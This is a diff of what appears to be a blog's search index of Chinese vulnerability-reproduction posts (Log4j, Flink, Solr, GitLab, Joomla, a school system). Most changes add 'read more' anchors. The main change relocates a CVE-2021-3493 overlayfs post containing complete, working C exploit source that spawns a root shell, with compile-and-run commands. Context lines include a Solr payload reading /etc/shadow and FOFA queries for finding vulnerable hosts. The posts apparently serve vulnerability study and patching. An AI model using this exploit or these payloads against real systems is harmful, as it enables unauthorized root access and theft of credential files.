@@ -4,6 +4,8 @@
     <title>【1039家校通】SQL注入和后台GETSHELL</title>
     <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
+<a id="more"></a>
+
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
@@ -38,6 +40,8 @@
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
 <p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
 <p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
+<a id="more"></a>
+
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
 <h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
@@ -67,6 +71,8 @@
     <url>/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
 app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<a id="more"></a>
+
 <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。在Apache Flink 1.5.1版本中引入了REST API，但其实现上存在多处缺陷，导致任意文件读取（CVE-2020-17519）和任意文件写入（CVE-2020-17518）漏洞<br>CVE-2020-17518攻击者利用REST API，可以修改HTTP头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1进程能访问到的）<br>CVE-2020-17519Apache Flink 1.11.0 允许攻击者通过JobManager进程的REST API读取JobManager本地文件系统上的任何文件（JobManager进程能访问到的）</p>
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>CVE-2020-17518<br>Apache:Apache Flink: 1.5.1 - 1.11.2</p>
 <p>CVE-2020-17519<br>Apache:Apache Flink: 1.11.0, 1.11.1, 1.11.2</p>
@@ -125,6 +131,8 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
     <title>【Apache】Apache Solr任意文件读取漏洞复现</title>
     <url>/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Solr&quot; || app&#x3D;&quot;&quot;Apache-Solr&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<a id="more"></a>
+
 <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Solr 全版本存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标系统的敏感文件。</p>
 <p>我综合了网上的两种漏洞利用，写了一篇比较详尽的文章。</p>
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Solr 全版本</p>
@@ -293,6 +301,8 @@ stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" c
     <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
 app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<a id="more"></a>
+
 <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
 <p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
 <h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
@@ -325,10 +335,189 @@ python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F
       </tags>
   </entry>
   <entry>
+    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
+    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
+cat &#x2F;etc&#x2F;issue        显示发行版本信息
+cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
+lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
+chmod +x exploit             给执行权限
+.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;sys&#x2F;types.h&gt;
+#include &lt;sys&#x2F;stat.h&gt;
+#include &lt;sys&#x2F;wait.h&gt;
+#include &lt;sys&#x2F;mount.h&gt;
+
+&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
+&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
+int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+
+
+#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
+#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
+#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
+#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
+#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
+#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
+#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;
+
+
+static void xmkdir(const char *path, mode_t mode)
+&#123;
+    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
+        err(1, &quot;mkdir %s&quot;, path);
+&#125;
+
+static void xwritefile(const char *path, const char *data)
+&#123;
+    int fd &#x3D; open(path, O_WRONLY);
+    if (fd &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, path);
+    ssize_t len &#x3D; (ssize_t) strlen(data);
+    if (write(fd, data, len) !&#x3D; len)
+        err(1, &quot;write %s&quot;, path);
+    close(fd);
+&#125;
+
+static void xcopyfile(const char *src, const char *dst, mode_t mode)
+&#123;
+    int fi, fo;
+
+    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, src);
+    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, dst);
+
+    char buf[4096];
+    ssize_t rd, wr;
+
+    for (;;) &#123;
+        rd &#x3D; read(fi, buf, sizeof(buf));
+        if (rd &#x3D;&#x3D; 0) &#123;
+            break;
+        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
+            if (errno &#x3D;&#x3D; EINTR)
+                continue;
+            err(1, &quot;read %s&quot;, src);
+        &#125;
+
+        char *p &#x3D; buf;
+        while (rd &gt; 0) &#123;
+            wr &#x3D; write(fo, p, rd);
+            if (wr &#x3D;&#x3D; -1) &#123;
+                if (errno &#x3D;&#x3D; EINTR)
+                    continue;
+                err(1, &quot;write %s&quot;, dst);
+            &#125;
+            p +&#x3D; wr;
+            rd -&#x3D; wr;
+        &#125;
+    &#125;
+
+    close(fi);
+    close(fo);
+&#125;
+
+static int exploit()
+&#123;
+    char buf[4096];
+
+    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
+    system(buf);
+
+    xmkdir(DIR_BASE, 0777);
+    xmkdir(DIR_WORK,  0777);
+    xmkdir(DIR_LOWER, 0777);
+    xmkdir(DIR_UPPER, 0777);
+    xmkdir(DIR_MERGE, 0777);
+
+    uid_t uid &#x3D; getuid();
+    gid_t gid &#x3D; getgid();
+
+    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
+        err(1, &quot;unshare&quot;);
+
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);
+
+    sprintf(buf, &quot;0 %d 1&quot;, uid);
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);
+
+    sprintf(buf, &quot;0 %d 1&quot;, gid);
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);
+
+    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
+    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
+        err(1, &quot;mount %s&quot;, DIR_MERGE);
+
+    &#x2F;&#x2F; all+ep
+    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
+
+    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
+    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
+        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
+
+    return 0;
+&#125;
+
+int main(int argc, char *argv[])
+&#123;
+    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
+        setuid(0);
+        setgid(0);
+        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
+        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
+    &#125;
+
+    pid_t child &#x3D; fork();
+    if (child &#x3D;&#x3D; -1)
+        err(1, &quot;fork&quot;);
+
+    if (child &#x3D;&#x3D; 0) &#123;
+        _exit(exploit());
+    &#125; else &#123;
+        waitpid(child, NULL, 0);
+    &#125;
+
+    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
+    err(1, &quot;execl %s&quot;, BIN_UPPER);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
+]]></content>
+      <categories>
+        <category>Linux安全</category>
+        <category>系统安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.4</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【CVE-2021-23132】Joomla!目录遍历及远程代码执行漏洞复现</title>
     <url>/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Joomla&quot;
 app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<a id="more"></a>
+
 <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，是全球知名的一套内容管理系统（CMS）。<br>本漏洞涉及到目录遍历及进一步导致的RCE漏洞。在Joomla! 3.0.0到3.9.24版本中，Joomla!的com_media组件配置允许被任意修改导致Web级别目录遍历，攻击者通过一系列操作，进一步会导致远程命令执行。</p>
 <h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N<br>漏洞等级：7.5 | 高危</p>
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>3.0.0 &lt;= Joomla! &lt;= 3.9.24</p>
@@ -714,187 +903,14 @@ app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hid
       </tags>
   </entry>
   <entry>
-    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
-    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
-cat &#x2F;etc&#x2F;issue        显示发行版本信息
-cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
-lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
-chmod +x exploit             给执行权限
-.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
-<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
-#define _GNU_SOURCE
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;err.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;sched.h&gt;
-#include &lt;sys&#x2F;types.h&gt;
-#include &lt;sys&#x2F;stat.h&gt;
-#include &lt;sys&#x2F;wait.h&gt;
-#include &lt;sys&#x2F;mount.h&gt;
-
-&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
-&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
-int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
-
-
-#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
-#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
-#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
-#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
-#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
-#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
-#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;
-
-
-static void xmkdir(const char *path, mode_t mode)
-&#123;
-    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
-        err(1, &quot;mkdir %s&quot;, path);
-&#125;
-
-static void xwritefile(const char *path, const char *data)
-&#123;
-    int fd &#x3D; open(path, O_WRONLY);
-    if (fd &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, path);
-    ssize_t len &#x3D; (ssize_t) strlen(data);
-    if (write(fd, data, len) !&#x3D; len)
-        err(1, &quot;write %s&quot;, path);
-    close(fd);
-&#125;
-
-static void xcopyfile(const char *src, const char *dst, mode_t mode)
-&#123;
-    int fi, fo;
-
-    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, src);
-    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, dst);
-
-    char buf[4096];
-    ssize_t rd, wr;
-
-    for (;;) &#123;
-        rd &#x3D; read(fi, buf, sizeof(buf));
-        if (rd &#x3D;&#x3D; 0) &#123;
-            break;
-        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
-            if (errno &#x3D;&#x3D; EINTR)
-                continue;
-            err(1, &quot;read %s&quot;, src);
-        &#125;
-
-        char *p &#x3D; buf;
-        while (rd &gt; 0) &#123;
-            wr &#x3D; write(fo, p, rd);
-            if (wr &#x3D;&#x3D; -1) &#123;
-                if (errno &#x3D;&#x3D; EINTR)
-                    continue;
-                err(1, &quot;write %s&quot;, dst);
-            &#125;
-            p +&#x3D; wr;
-            rd -&#x3D; wr;
-        &#125;
-    &#125;
-
-    close(fi);
-    close(fo);
-&#125;
-
-static int exploit()
-&#123;
-    char buf[4096];
-
-    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
-    system(buf);
-
-    xmkdir(DIR_BASE, 0777);
-    xmkdir(DIR_WORK,  0777);
-    xmkdir(DIR_LOWER, 0777);
-    xmkdir(DIR_UPPER, 0777);
-    xmkdir(DIR_MERGE, 0777);
-
-    uid_t uid &#x3D; getuid();
-    gid_t gid &#x3D; getgid();
-
-    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
-        err(1, &quot;unshare&quot;);
-
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);
-
-    sprintf(buf, &quot;0 %d 1&quot;, uid);
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);
-
-    sprintf(buf, &quot;0 %d 1&quot;, gid);
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);
-
-    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
-    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
-        err(1, &quot;mount %s&quot;, DIR_MERGE);
-
-    &#x2F;&#x2F; all+ep
-    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
-
-    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
-    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
-        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
-
-    return 0;
-&#125;
-
-int main(int argc, char *argv[])
-&#123;
-    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
-        setuid(0);
-        setgid(0);
-        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
-        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
-    &#125;
-
-    pid_t child &#x3D; fork();
-    if (child &#x3D;&#x3D; -1)
-        err(1, &quot;fork&quot;);
-
-    if (child &#x3D;&#x3D; 0) &#123;
-        _exit(exploit());
-    &#125; else &#123;
-        waitpid(child, NULL, 0);
-    &#125;
-
-    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
-    err(1, &quot;execl %s&quot;, BIN_UPPER);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
-]]></content>
-      <categories>
-        <category>Linux安全</category>
-        <category>系统安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.4</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>dedecms网站搭建</title>
     <url>/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<ol>
 <li>下载织梦开源程序</li>
 </ol>
